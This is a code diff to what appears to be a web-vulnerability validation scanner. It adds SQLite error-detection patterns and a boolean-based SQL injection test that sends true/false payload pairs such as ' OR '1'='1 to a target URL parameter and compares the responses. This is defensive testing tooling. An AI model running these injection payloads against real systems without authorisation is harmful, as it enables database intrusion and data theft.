@@ -24,16 +24,27 @@ SQL_ERROR_PATTERNS = [
     r"sql syntax",
     r"mysql",
     r"postgresql",
-    r"sqlite",
     r"oracle",
     r"unclosed quotation",
     r"quoted string not properly terminated",
     r"syntax error",
     r"ORA-\d+",
     r"PG::SyntaxError",
-    r"SQLite3::SQLException",
     r"com\.mysql\.jdbc",
     r"org\.postgresql",
+    # SQLite-specific patterns
+    r"sqlite",
+    r"sqlite3",
+    r"SQLite3::SQLException",
+    r"sqlite3\.OperationalError",
+    r"sqlite3\.ProgrammingError",
+    r"near \".*\": syntax error",
+    r"unrecognized token",
+    r"no such column",
+    r"no such table",
+    r"SQLITE_ERROR",
+    r"SELECTs to the left and right of UNION",
+    r"incomplete input",
 ]
 
 # Command injection error patterns
@@ -279,6 +290,122 @@ def test_error_based_sqli(
     }
 
 
+def test_boolean_based_sqli(
+    url: str,
+    param: str,
+    original_value: str,
+    headers: Optional[Dict] = None,
+    timeout: int = 30,
+) -> Dict[str, Any]:
+    """
+    Test for boolean-based SQL injection (works well with SQLite).
+
+    Compares responses between true and false conditions to detect SQLi.
+
+    Returns:
+        Test result dictionary with status and evidence
+    """
+    # Boolean payload pairs (true condition, false condition)
+    payload_pairs = [
+        ("' OR '1'='1", "' OR '1'='2"),
+        ("' OR 1=1--", "' OR 1=2--"),
+        ("1' OR '1'='1", "1' AND '1'='2"),
+        ("' OR 1=1 OR '1'='1", "' AND 1=2 AND '1'='1"),
+        ("1 OR 1=1", "1 AND 1=2"),
+    ]
+
+    # Baseline request
+    try:
+        baseline_url = f"{url}?{param}={quote(original_value)}"
+        baseline_resp = requests.get(baseline_url, headers=headers, timeout=timeout)
+        baseline_len = len(baseline_resp.text)
+    except requests.RequestException as e:
+        return {
+            "status": "UNVALIDATED",
+            "reason": f"Baseline request failed: {str(e)}",
+            "evidence": None,
+        }
+
+    baseline_snippet, baseline_hash, baseline_meta = truncate_and_hash(baseline_resp.text)
+
+    baseline = {
+        "url": baseline_url,
+        "method": "GET",
+        "status": baseline_resp.status_code,
+        "content_length": baseline_len,
+        "response_hash": baseline_hash,
+        **baseline_meta,
+    }
+
+    # Test each payload pair
+    for true_payload, false_payload in payload_pairs:
+        try:
+            # True condition request
+            true_url = f"{url}?{param}={quote(original_value + true_payload)}"
+            true_resp = requests.get(true_url, headers=headers, timeout=timeout)
+            true_len = len(true_resp.text)
+
+            # False condition request
+            false_url = f"{url}?{param}={quote(original_value + false_payload)}"
+            false_resp = requests.get(false_url, headers=headers, timeout=timeout)
+            false_len = len(false_resp.text)
+        except requests.RequestException:
+            continue
+
+        # Check for significant difference between true and false conditions
+        len_diff = abs(true_len - false_len)
+        min_diff_threshold = 50  # Minimum byte difference to consider significant
+
+        if len_diff >= min_diff_threshold:
+            true_snippet, true_hash, true_meta = truncate_and_hash(true_resp.text)
+            false_snippet, false_hash, false_meta = truncate_and_hash(false_resp.text)
+
+            return {
+                "status": "VALIDATED",
+                "injection_type": "sql_injection_boolean_based",
+                "cwe": "CWE-89",
+                "baseline": baseline,
+                "test": {
+                    "true_condition": {
+                        "url": true_url,
+                        "status": true_resp.status_code,
+                        "content_length": true_len,
+                        "response_hash": true_hash,
+                    },
+                    "false_condition": {
+                        "url": false_url,
+                        "status": false_resp.status_code,
+                        "content_length": false_len,
+                        "response_hash": false_hash,
+                    },
+                },
+                "evidence": f"Boolean-based SQLi: {len_diff} byte difference between true/false",
+                "payload_used": {"true": true_payload, "false": false_payload},
+            }
+
+        # Also check if status codes differ
+        if true_resp.status_code != false_resp.status_code:
+            return {
+                "status": "VALIDATED",
+                "injection_type": "sql_injection_boolean_based",
+                "cwe": "CWE-89",
+                "baseline": baseline,
+                "test": {
+                    "true_condition": {"url": true_url, "status": true_resp.status_code},
+                    "false_condition": {"url": false_url, "status": false_resp.status_code},
+                },
+                "evidence": f"Boolean-based SQLi: status {true_resp.status_code} vs {false_resp.status_code}",
+                "payload_used": {"true": true_payload, "false": false_payload},
+            }
+
+    return {
+        "status": "FALSE_POSITIVE",
+        "injection_type": "sql_injection",
+        "baseline": baseline,
+        "evidence": "No significant difference between true/false conditions",
+    }
+
+
 def test_xss(
     url: str,
     param: str,
@@ -491,6 +618,7 @@ def run_injection_tests(
     test_functions = {
         "sqli_time": lambda: test_time_based_sqli(url, param, original_value, headers, timeout),
         "sqli_error": lambda: test_error_based_sqli(url, param, original_value, headers, timeout),
+        "sqli_boolean": lambda: test_boolean_based_sqli(url, param, original_value, headers, timeout),
         "xss": lambda: test_xss(url, param, headers, timeout),
         "cmdi": lambda: test_command_injection(url, param, original_value, headers, timeout),
         "ssti": lambda: test_ssti(url, param, headers, timeout),
@@ -510,8 +638,8 @@ def main():
     parser.add_argument("--value", default="1", help="Original parameter value")
     parser.add_argument(
         "--types",
-        default="sqli_time,sqli_error,xss,cmdi,ssti",
-        help="Comma-separated injection types",
+        default="sqli_time,sqli_error,sqli_boolean,xss,cmdi,ssti",
+        help="Comma-separated injection types (sqli_boolean recommended for SQLite)",
     )
     parser.add_argument("--timeout", type=int, default=30, help="Request timeout")
     parser.add_argument("--output", required=True, help="Output JSON file")
